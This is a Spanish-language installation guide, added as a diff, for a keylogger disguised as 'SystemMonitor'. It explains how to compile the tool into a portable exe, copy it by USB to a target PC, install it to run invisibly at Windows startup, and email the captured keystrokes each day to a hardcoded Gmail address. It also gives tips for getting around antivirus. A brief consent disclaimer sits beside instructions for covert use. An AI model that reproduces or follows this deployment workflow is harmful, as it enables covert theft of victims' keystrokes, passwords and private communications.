@@ -1,0 +1,260 @@
+╔════════════════════════════════════════════════════════════════╗
+║          MONITOR DE SISTEMA - GUÍA DE INSTALACIÓN             ║
+╚════════════════════════════════════════════════════════════════╝
+
+📋 ARCHIVOS INCLUIDOS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+• keylogger.py                      → Código fuente
+• instalar_y_compilar.bat          → Compilador automático
+• instalar_inicio_automatico.bat   → Instalador en PC destino
+• desinstalar.bat                  → Desinstalador
+• INSTRUCCIONES.txt                → Este archivo
+
+
+═══════════════════════════════════════════════════════════════
+  ⚠️ IMPORTANTE: 32-BIT vs 64-BIT
+═══════════════════════════════════════════════════════════════
+
+🔍 COMPATIBILIDAD:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+   Python 32-bit → .exe funciona en Windows 32-bit Y 64-bit ✓✓
+   Python 64-bit → .exe SOLO funciona en Windows 64-bit ✓
+
+💡 RECOMENDACIÓN:
+   • Instala Python 32-bit para máxima compatibilidad
+   • Si solo usarás en Windows 64-bit, cualquiera sirve
+
+
+⚠️ SI LA PC DESTINO NO TIENE PYTHON:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+   ✅ NO ES NECESARIO INSTALAR PYTHON EN LA PC DESTINO
+   
+   El .exe compilado es COMPLETAMENTE INDEPENDIENTE:
+      • No necesita Python
+      • No necesita dependencias
+      • Es 100% portable
+      • Solo copia y ejecuta
+
+
+═══════════════════════════════════════════════════════════════
+  PARTE 1: EN TU PC (DONDE COMPILARÁS)
+═══════════════════════════════════════════════════════════════
+
+1️⃣ INSTALAR PYTHON (Si no lo tienes)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+   Opción A - Instalación Manual:
+   ────────────────────────────────
+   a) Ve a: https://www.python.org/downloads/
+   b) Descarga Python 3.11 (32-bit para máxima compatibilidad)
+   c) Durante instalación:
+      ✓ Marca: "Add Python to PATH"
+      ✓ Marca: "Install for all users" (opcional)
+   d) Reinicia la terminal después de instalar
+
+   Opción B - Instalación Automática:
+   ────────────────────────────────────
+   • El script instalar_y_compilar.bat puede descargar
+     e instalar Python automáticamente
+   • Solo sigue las instrucciones en pantalla
+
+
+2️⃣ COMPILAR EL EJECUTABLE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+   a) Haz clic derecho en: instalar_y_compilar.bat
+   b) Selecciona "Ejecutar como administrador"
+   c) El script automáticamente:
+      • Detecta tu sistema (32 o 64-bit)
+      • Instala pip si no existe
+      • Instala pynput (captura de teclado)
+      • Instala pyinstaller (compilador)
+      • Compila el .exe
+   d) Espera 1-3 minutos
+   
+   ✓ Resultado:
+      • Carpeta: dist\
+      • Archivo: SystemMonitor.exe (o SystemMonitor_x86.exe/x64.exe)
+
+
+3️⃣ PREPARAR PARA DISTRIBUCIÓN
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+   Copia estos archivos a un USB:
+   
+   📁 Carpeta USB:
+      ├── SystemMonitor.exe                    (de la carpeta dist/)
+      ├── instalar_inicio_automatico.bat
+      └── desinstalar.bat
+
+
+═══════════════════════════════════════════════════════════════
+  PARTE 2: EN LA PC DESTINO (SIN PYTHON - SOLO EL .EXE)
+═══════════════════════════════════════════════════════════════
+
+4️⃣ INSTALAR EN EL EQUIPO
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+   a) Copia los 3 archivos del USB a cualquier carpeta
+   b) Haz clic derecho en: instalar_inicio_automatico.bat
+   c) Selecciona "Ejecutar como administrador"
+   
+   ✓ El instalador automáticamente:
+      • Detecta si el sistema es 32 o 64-bit
+      • Verifica compatibilidad del .exe
+      • Copia el programa a: %APPDATA%\SystemMonitor
+      • Lo configura para iniciar con Windows
+      • Lo ejecuta en segundo plano (invisible)
+
+   ⚠️ NO NECESITAS INSTALAR PYTHON EN ESTA PC
+
+
+═══════════════════════════════════════════════════════════════
+  CONFIGURACIÓN Y FUNCIONAMIENTO
+═══════════════════════════════════════════════════════════════
+
+⚙️ CONFIGURACIÓN AUTOMÁTICA
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+• Nombre del equipo: Se detecta automáticamente
+• Horario de captura: 06:00 AM - 08:00 PM
+• Envío automático: 08:00 PM (20:00) cada día
+• Destino del correo: yarokasas@gmail.com
+
+
+📧 CORREOS ENVIADOS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Recibirás un correo diario con:
+   • Asunto: [Keylog] NOMBRE_EQUIPO - 2025-10-15
+   • Adjunto: system_log.dat (registro de teclas)
+   • Horario: Exactamente a las 8:00 PM
+
+
+🔍 VERIFICAR QUE ESTÁ FUNCIONANDO
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Método 1: Administrador de Tareas
+   1. Presiona: Ctrl + Shift + Esc
+   2. Busca en procesos: SystemMonitor.exe
+   3. Si aparece, está funcionando ✓
+
+Método 2: Explorador de Archivos
+   1. Presiona: Windows + R
+   2. Escribe: %APPDATA%\SystemMonitor
+   3. Verifica que existan los archivos
+
+
+📁 ARCHIVOS QUE CREA
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+%APPDATA%\SystemMonitor\
+├── SystemMonitor.exe      → Programa principal
+├── system_log.dat         → Registro de teclas
+└── config.dat             → Configuración (nombre del equipo)
+
+
+═══════════════════════════════════════════════════════════════
+  DESINSTALACIÓN
+═══════════════════════════════════════════════════════════════
+
+🗑️ REMOVER DEL SISTEMA
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+   1. Ejecuta: desinstalar.bat (como administrador)
+   
+   ✓ Esto eliminará:
+      • El proceso en ejecución
+      • Todos los archivos
+      • El inicio automático
+      • Los registros
+
+
+═══════════════════════════════════════════════════════════════
+  PERSONALIZACIÓN (OPCIONAL)
+═══════════════════════════════════════════════════════════════
+
+Para cambiar configuraciones, edita keylogger.py antes de compilar:
+
+📧 Cambiar correo destino:
+   Línea 28: MAIL_TO = "tucorreo@gmail.com"
+
+⏰ Cambiar hora de envío:
+   Línea 22: HORA_ENVIO = time(hour=20, minute=0)  # 8 PM
+
+🕐 Cambiar horario de captura:
+   Línea 20: START = time(hour=6, minute=0)   # 6 AM
+   Línea 21: END = time(hour=20, minute=0)    # 8 PM
+
+
+═══════════════════════════════════════════════════════════════
+  SOLUCIÓN DE PROBLEMAS
+═══════════════════════════════════════════════════════════════
+
+❌ "Python no está instalado"
+   → Instala Python desde: https://www.python.org/downloads/
+   → Marca "Add Python to PATH" durante instalación
+
+❌ "No se encuentra SystemMonitor.exe"
+   → Verifica que ejecutaste: instalar_y_compilar.bat
+   → Busca en la carpeta: dist\
+
+❌ "No recibo correos"
+   → Verifica la hora del sistema del PC
+   → Revisa que haya actividad registrada
+   → Confirma credenciales SMTP en el código
+
+❌ "El programa no inicia con Windows"
+   → Ejecuta el instalador como administrador
+   → Verifica: Win + R → shell:startup
+
+❌ "Antivirus bloquea el programa"
+   → Agrega excepción en el antivirus para:
+     %APPDATA%\SystemMonitor\SystemMonitor.exe
+
+
+═══════════════════════════════════════════════════════════════
+  CARACTERÍSTICAS TÉCNICAS
+═══════════════════════════════════════════════════════════════
+
+✓ Completamente invisible (sin ventana, sin icono en bandeja)
+✓ No requiere instalación de Python en PC destino
+✓ Ejecutable portable de ~15-20 MB
+✓ Resistente a errores (se reinicia automáticamente)
+✓ Limpia el log después de cada envío
+✓ Compatible con Windows 10/11
+✓ Uso mínimo de recursos (< 20 MB RAM)
+
+
+═══════════════════════════════════════════════════════════════
+  SEGURIDAD Y PRIVACIDAD
+═══════════════════════════════════════════════════════════════
+
+⚠️ IMPORTANTE:
+   • Este software es para uso personal/empresarial legítimo
+   • Asegúrate de tener autorización legal para su uso
+   • Respeta las leyes de privacidad locales
+   • Solo para equipos propios o con consentimiento
+
+📧 Credenciales SMTP:
+   • Almacenadas en el código fuente
+   • Para mayor seguridad, usa variables de entorno
+   • Considera usar contraseñas de aplicación
+
+
+═══════════════════════════════════════════════════════════════
+  SOPORTE
+═══════════════════════════════════════════════════════════════
+
+Para reportar problemas o preguntas:
+   • Revisa primero la sección "Solución de Problemas"
+   • Verifica que todos los archivos estén presentes
+   • Ejecuta siempre como administrador
+
+
+═══════════════════════════════════════════════════════════════
+
+                         Versión 1.0
+                    Última actualización: 2025
+
+═══════════════════════════════════════════════════════════════
